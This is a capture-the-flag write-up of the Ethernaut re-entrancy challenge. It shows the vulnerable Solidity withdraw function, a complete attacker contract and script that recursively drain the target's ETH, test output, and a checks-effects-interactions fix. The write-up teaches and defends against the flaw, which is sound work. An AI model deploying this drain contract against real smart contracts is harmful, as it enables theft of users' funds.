# Re-entrancy — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 10 — Re-entrancy](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-reentrance) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Reentrance.sol` |
| **Solidity** | `^0.6.12` |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`withdraw` verifies `balances[msg.sender]`, then sends ETH with `call{value:}` (all remaining gas), and only afterward reduces the balance. An attacker contract donates, withdraws, and in `receive()` calls `withdraw` again before the balance is cleared — draining the contract.

SafeMath on `donate` does not protect `withdraw`. On 0.6, the final unchecked `-=` can also underflow after recursive withdrawals.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Reentrance ETH balance is zero | `address(reentranceInstance).balance == 0` |

---

## Finding

### [C-01] Reentrancy in `withdraw`

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Reentrancy / CEI violation |
| **Location** | `src/Reentrance.sol` `withdraw` |
| **CWE** | [CWE-841](https://cwe.mitre.org/data/definitions/841.html) |
| **SWC** | [SWC-107](https://swcregistry.io/docs/SWC-107) — Reentrancy |

#### Vulnerable code

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount; // too late
    }
}
```

#### Proof of concept

```bash
cd web3-ctf-challenges/10-ethernaut-reentrance
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 380447)
```

---

## Attack scenario

### 7-question gate

| Step | Answer |
|------|--------|
| **1. Setup** | Deploy helper; fund with seed `S` (often = victim balance) |
| **2. Call** | `donate(helper, S)` then `withdraw(S)`; `receive` reenters |
| **3. Result** | Victim balance 0; helper holds ETH |
| **4. Cost** | Seed donation (recovered via drain) + gas |
| **5. ROI** | All ETH in Reentrance |
| **6. Privileged?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
contract HelperContract {
    Reentrance private immutable target;
    uint256 private amount;

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "need donation seed");
        amount = msg.value;
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint256 victimBal = address(target).balance;
        if (victimBal > 0) {
            uint256 toWithdraw = amount;
            if (toWithdraw > victimBal) {
                toWithdraw = victimBal;
            }
            target.withdraw(toWithdraw);
        }
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    uint256 seed = address(reentranceInstance).balance;
    if (seed == 0) seed = 0.001 ether;

    HelperContract helper = new HelperContract(payable(address(reentranceInstance)));
    helper.attack{value: seed}();

    vm.stopBroadcast();
}
```

---

## Remediation

```solidity
function withdraw(uint256 _amount) public nonReentrant {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] -= _amount; // effects first
    (bool ok,) = msg.sender.call{value: _amount}("");
    require(ok);
}
```

---

## Key lessons

1. **Checks-Effects-Interactions** — mutate state before external calls.
2. **`call{value:}` forwards gas** — enough for reentrancy; `.transfer` is not a complete fix either.
3. **Partial SafeMath is a trap** — harden every arithmetic path.

---

## References

- [SCH Re-entrancy challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-reentrance)
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- Local: `Exploit.s.sol`, `test/ReentranceExploit.t.sol`
